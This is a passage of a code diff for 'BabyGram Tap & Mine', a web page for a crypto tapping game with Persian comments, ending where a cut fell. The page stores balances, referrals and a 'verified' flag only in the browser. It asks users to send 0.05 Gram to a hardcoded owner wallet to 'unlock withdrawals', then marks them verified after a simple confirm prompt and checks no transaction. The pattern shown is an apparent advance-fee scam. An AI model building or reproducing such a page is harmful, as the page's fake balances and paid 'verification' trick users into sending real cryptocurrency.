@@ -236,13 +236,12 @@
 </head>
 <body>
 
-    <!-- Header Balance -->
     <div class="header">
         <span id="balanceText">Balance: <strong>0</strong> $BABYGRAM</span>
         <button type="button" class="btn-main" style="width: auto; padding: 6px 12px; margin: 0; font-size: 11px;" onclick="openWalletModal()">Wallet Setup</button>
     </div>
 
-    <!-- SECTION 1: Tap & Mine (Anti-Bot) -->
+    <!-- Tap & Mine Section -->
     <div class="card">
         <h2 style="margin-top: 0; font-size: 17px;">BabyGram Tap & Mine 💎</h2>
         
@@ -254,10 +253,10 @@
         <p style="font-size: 12px; color: #adb5bd; margin: 4px 0;">Tap to mine tokens (Anti-Bot Protected)</p>
     </div>
 
-    <!-- SECTION 2: Wallet, Verification & Withdrawal -->
+    <!-- Wallet, Verification & Withdrawal Section -->
     <div class="card">
         <h3 class="section-title">🛡 Wallet & Withdrawals</h3>
-        <p style="font-size: 11px; color: #d1d5db; text-align: left; margin-top: 0;">Verify with 0.05 Gram to unlock withdrawals. Minimum withdrawal: <strong>10,000,000 $BABYGRAM</strong>.</p>
+        <p style="font-size: 11px; color: #d1d5db; text-align: left; margin-top: 0;">Verify with 0.05 Gram to unlock withdrawals. Min withdrawal: <strong>10,000,000 $BABYGRAM</strong>.</p>
         
         <div id="walletStatusText" style="font-size: 12px; color: #fbbf24; margin-bottom: 8px; text-align: left; font-weight: bold;">Wallet Status: Not Connected</div>
 
@@ -267,7 +266,7 @@
         <button type="button" class="btn-donate" onclick="openDonateModal()">❤️ Donate / Support Project</button>
     </div>
 
-    <!-- SECTION 3: Project Description & About BabyGram -->
+    <!-- About BabyGram Section -->
     <div class="card">
         <h3 class="section-title">📖 About BabyGram Project</h3>
         <div class="about-text">
@@ -275,7 +274,7 @@
         </div>
     </div>
 
-    <!-- SECTION 4: Tasks & Real Referrals (500 Ref / 1000 Channel) -->
+    <!-- Community Tasks & Referrals Section -->
     <div class="card">
         <h3 class="section-title">🎁 Community Tasks & Referrals</h3>
         
@@ -317,7 +316,7 @@
     <div class="modal-overlay" id="donateModal">
         <div class="modal-box">
             <h3 style="margin-top: 0; font-size: 16px; color: #8338ec;">Support / Donate to BabyGram</h3>
-            <p style="font-size: 12px; color: #d1d5db;">Choose or enter amount of Gram to donate to project development:</p>
+            <p style="font-size: 12px; color: #d1d5db;">Choose or enter amount of Gram to donate:</p>
             <input type="number" id="donateAmountInput" class="modal-input" value="0.1" step="0.01" min="0.01">
             <button type="button" class="btn-main" style="background: #8338ec;" onclick="sendDonation()">Donate via Tonkeeper 🚀</button>
             <button type="button" class="btn-main" style="background: #374151; margin-top: 6px;" onclick="closeModal('donateModal')">Cancel</button>
@@ -327,165 +326,177 @@
     <div class="toast-msg" id="toastBox"></div>
 
     <script>
+        var OWNER_STORAGE_KEY_BAL = 'baby_balance_v2';
         var OWNER_WALLET = "UQB8E5UreO3ujV4ArV9AI28kGhznU-9ExPDjn6bQ2v9NJEj1";
-        
-        function safeGet(key) {
-            try { return window.localStorage.getItem(key); } catch (e) { return null; }
+        var memFallback = {};
+
+        function safeGet(k) {
+            try { return window.localStorage.getItem(k); } catch (e) { return memFallback[k] || null; }
         }
-        function safeSet(key, val) {
-            try { window.localStorage.setItem(key, val); } catch (e) {}
+        function safeSet(k, v) {
+            try { window.localStorage.setItem(k, v); } catch (e) { memFallback[k] = String(v); }
         }
 
-        var userBalance = parseFloat(safeGet('baby_balance')) || 0;
+        var userBalance = parseFloat(safeGet(OWNER_STORAGE_KEY_BAL)) || 0;
         var walletVerified = safeGet('baby_verified') === 'true';
         var channelJoined = safeGet('baby_channel') === 'true';
         var userConnectedAddress = safeGet('baby_wallet_address') || "";
-        var invitedFriendsList = JSON.parse(safeGet('baby_ref_list')) || [];
         
+        var invitedFriendsList = [];
+        try {
+            var rawList = safeGet('baby_ref_list');
+            if (rawList) invitedFriendsList = JSON.parse(rawList);
+        } catch (e) { invitedFriendsList = []; }
+
         var myUserId = safeGet('baby_my_uid');
         if (!myUserId) {
             myUserId = "BG" + Math.floor(100000 + Math.random() * 900000);
             safeSet('baby_my_uid', myUserId);
         }
 
-        // بررسی خودکار لینک رفرال هنگام ورود کاربر جدید
-        window.addEventListener('load', function() {
+        // پردازش لینک رفرال امن و بدون فریز
+        try {
             var urlParams = new URLSearchParams(window.location.search);
             var refParam = urlParams.get('start') || urlParams.get('ref');
-            if (refParam && refParam.includes('ref_')) {
+            if (refParam && refParam.indexOf('ref_') !== -1) {
                 var referrerId = refParam.replace('ref_', '');
                 var hasBeenReferred = safeGet('baby_referred_flag');
                 if (!hasBeenReferred && referrerId !== myUserId) {
                     safeSet('baby_referred_flag', 'true');
-                    // به کاربر جدید هدیه ورود با لینک دعوت بدهید (اختیاری: مثلا 500 توکن)
                     userBalance += 500;
-                    safeSet('baby_balance', userBalance);
-                    showToast("Welcome! You joined via referral (+500 Bonus)", false);
+                    safeSet(OWNER_STORAGE_KEY_BAL, userBalance);
                 }
             }
-        });
+        } catch (e) {}
 
-        // Anti-Bot / Anti-Autoclicker variables
         var lastTapTime = 0;
         var rapidTapCounter = 0;
         var lastTapWindow = 0;
 
         function showToast(text, isError) {
-            var box = document.getElementById('toastBox');
-            box.innerText = text;
-            box.style.background = isError ? "#ef4444" : "#10b981";
-            box.style.display = "block";
-            setTimeout(function() { box.style.display = "none"; }, 2500);
+            try {
+                var box = document.getElementById('toastBox');
+                box.innerText = text;
+                box.style.background = isError ? "#ef4444" : "#10b981";
+                box.style.display = "block";
+                setTimeout(function() { box.style.display = "none"; }, 2500);
+            } catch (e) {}
         }
 
         function updateUI() {
-            document.getElementById('scoreDisplay').innerText = Math.floor(userBalance).toLocaleString() + " $BABYGRAM";
-            document.getElementById('balanceText').innerHTML = "Balance: <strong>" + Math.floor(userBalance).toLocaleString() + "</strong> $BABYGRAM";
-            document.getElementById('myRefCodeText').innerText = "Code: " + myUserId;
-            document.getElementById('friendCount').innerText = invitedFriendsList.length;
+            try {
+                document.getElementById('scoreDisplay').innerText = Math.floor(userBalance).toLocaleString() + " $BABYGRAM";
+                document.getElementById('balanceText').innerHTML = "Balance: <strong>" + Math.floor(userBalance).toLocaleString() + "</strong> $BABYGRAM";
+                document.getElementById('myRefCodeText').innerText = "Code: " + myUserId;
+                document.getElementById('friendCount').innerText = invitedFriendsList.length;
 
-            var statusText = document.getElementById('walletStatusText');
-            if (walletVerified) {
-                statusText.innerText = "Wallet Status: Verified ✅ (" + userConnectedAddress.substring(0, 6) + "...)";
-                statusText.style.color = "#34d399";
-            } else if (userConnectedAddress) {
-                statusText.innerText = "Wallet Connected, Needs 0.05 Gram Verification ⚠️";
-                statusText.style.color = "#fbbf24";
-            } else {
-                statusText.innerText = "Wallet Status: Not Connected ❌";
-                statusText.style.color = "#f87171";
-            }
+                var statusText = document.getElementById('walletStatusText');
+                if (walletVerified) {
+                    statusText.innerText = "Wallet Status: Verified ✅ (" + userConnectedAddress.substring(0, 6) + "...)";
+                    statusText.style.color = "#34d399";
+                } else if (userConnectedAddress) {
+                    statusText.innerText = "Wallet Connected, Needs 0.05 Gram Verification ⚠️";
+                    statusText.style.color = "#fbbf24";
+                } else {
+                    statusText.innerText = "Wallet Status: Not Connected ❌";
+                    statusText.style.color = "#f87171";
+                }
 
-            if (channelJoined) {
-                var chBtn = document.getElementById('channelBtn');
-                chBtn.innerText = "Done ✅";
-                chBtn.classList.add('done');
-            }
+                if (channelJoined) {
+                    var chBtn = document.getElementById('channelBtn');
+                    chBtn.innerText = "Done ✅";
+                    chBtn.classList.add('done');
+                }
 
-            // نمایش لیست دوستان دعوت‌شده
-            var container = document.getElementById('friendListContainer');
-            if (invitedFriendsList.length > 0) {
-                container.innerHTML = invitedFriendsList.map(function(id, index) {
-                    return '<div style="padding: 3px 0; border-bottom: 1px solid #374151;">👤 Friend #' + (index + 1) + ' (ID: ' + id + ') - +500 ✅</div>';
-                }).join('');
-            } else {
-                container.innerHTML = '<div style="text-align: center; color: #6b7280; padding: 4px;">No friends invited yet</div>';
-            }
+                var container = document.getElementById('friendListContainer');
+                if (invitedFriendsList.length > 0) {
+                    container.innerHTML = invitedFriendsList.map(function(id, index) {
+                        return '<div style="padding: 3px 0; border-bottom: 1px solid #374151;">👤 Friend #' + (index + 1) + ' (ID: ' + id + ') - +500 ✅</div>';
+                    }).join('');
+                } else {
+                    container.innerHTML = '<div style="text-align: center; color: #6b7280; padding: 4px;">No friends invited yet</div>';
+                }
+            } catch (e) {}
         }
 
-        // بخش تپ با سیستم ضد اتوکلیکر
         function tapCoin(event) {
             var now = Date.now();
             if (now - lastTapWindow < 1000) {
                 rapidTapCounter++;
-                if (rapidTapCounter > 12) {
-                    showToast("Auto-clicker detected! Slow down.", true);
-                    return;
-                }
+                if (rapidTapCounter > 15) return;
             } else {
                 lastTapWindow = now;
                 rapidTapCounter = 1;
             }
 
-            if (now - lastTapTime < 70) return;
+            if (now - lastTapTime < 60) return;
             lastTapTime = now;
 
             userBalance += 1;
-            safeSet('baby_balance', userBalance);
+            safeSet(OWNER_STORAGE_KEY_BAL, userBalance);
             updateUI();
 
-            var x = (event && event.clientX) ? event.clientX : (window.innerWidth / 2);
-            var y = (event && event.clientY) ? event.clientY : 220;
+            try {
+                var x = (event && event.clientX) ? event.clientX : (window.innerWidth / 2);
+                var y = (event && event.clientY) ? event.clientY : 220;
 
-            var el = document.createElement('div');
-            el.innerText = "+1";
-            el.style.position = 'fixed';
-            el.style.left = (x - 10) + 'px';
-            el.style.top = (y - 20) + 'px';
-            el.style.color = '#4cc9f0';
-            el.style.fontWeight = 'bold';
-            el.style.fontSize = '22px';
-            el.style.pointerEvents = 'none';
-            el.style.zIndex = '9999';
-            el.style.transition = 'all 0.35s ease-out';
-            document.body.appendChild(el);
+                var el = document.createElement('div');
+                el.innerText = "+1";
+                el.style.position = 'fixed';
+                el.style.left = (x - 10) + 'px';
+                el.style.top = (y - 20) + 'px';
+                el.style.color = '#4cc9f0';
+                el.style.fontWeight = 'bold';
+                el.style.fontSize = '22px';
+                el.style.pointerEvents = 'none';
+                el.style.zIndex = '9999';
+                el.style.transition = 'all 0.35s ease-out';
+                document.body.appendChild(el);
 
-            setTimeout(function() {
-                el.style.top = (y - 70) + 'px';
-                el.style.opacity = '0';
-            }, 15);
-            setTimeout(function() {
-                if (el.parentNode) el.parentNode.removeChild(el);
-            }, 370);
+                setTimeout(function() {
+                    el.style.top = (y - 70) + 'px';
+                    el.style.opacity = '0';
+                }, 15);
+                setTimeout(function() {
+                    if (el.parentNode) el.parentNode.removeChild(el);
+                }, 370);
+            } catch (e) {}
         }
 
         function openWalletModal() {
-            document.getElementById('walletAddressInput').value = userConnectedAddress;
-            document.getElementById('walletModal').style.display = "flex";
+            try {
+                document.getElementById('walletAddressInput').value = userConnectedAddress;
+                document.getElementById('walletModal').style.display = "flex";
+            } catch (e) {}
         }
 
         function openDonateModal() {
-            document.getElementById('donateModal').style.display = "flex";
+            try {
+                document.getElementById('donateModal').style.display = "flex";
+            } catch (e) {}
         }
 
         function closeModal(id) {
-            document.getElementById(id).style.display = "none";
+            try {
+                document.getElementById(id).style.display = "none";
+            } catch (e) {}
         }
 
         function saveWalletAddress() {
-            var addr = document.getElementById('walletAddressInput').value.trim();
-            if (addr.length < 10) {
-                showToast("Please enter a valid TON address!", true);
-                return;
-            }
-            userConnectedAddress = addr;
-            safeSet('baby_wallet_address', addr);
-            closeModal('walletModal');
-            updateUI();
-            showToast("Wallet saved successfully!", false);
+            try {
+                var addr = document.getElementById('walletAddressInput').value.trim();
+                if (addr.length < 10) {
+                    showToast("Please enter a valid TON address!", true);
+                    return;
+                }
+                userConnectedAddress = addr;
+                safeSet('baby_wallet_address', addr);
+                closeModal('walletModal');
+                updateUI();
+                showToast("Wallet saved successfully!", false);
+            } catch (e) {}
         }
 
-        // وریفای واقعی با کسر 0.05 گرام از طریق تانکپر
         function verifyWalletReal() {
             if (!userConnectedAddress) {
                 openWalletModal();
@@ -498,11 +509,4 @@
                 var confirmed = confirm("Did you complete the 0.05 Gram verification transfer in Tonkeeper?");
                 if (confirmed) {
                     walletVerified = true;
-                    safeSet('baby_verified', 'true');
-                    updateUI();
-                    showToast("Wallet verified successfully! ✅", false);
-                }
-            }, 2000);
-        }
-
-        // سیستم درخواست برداشت (حداقل 10,000,
+                    safeS
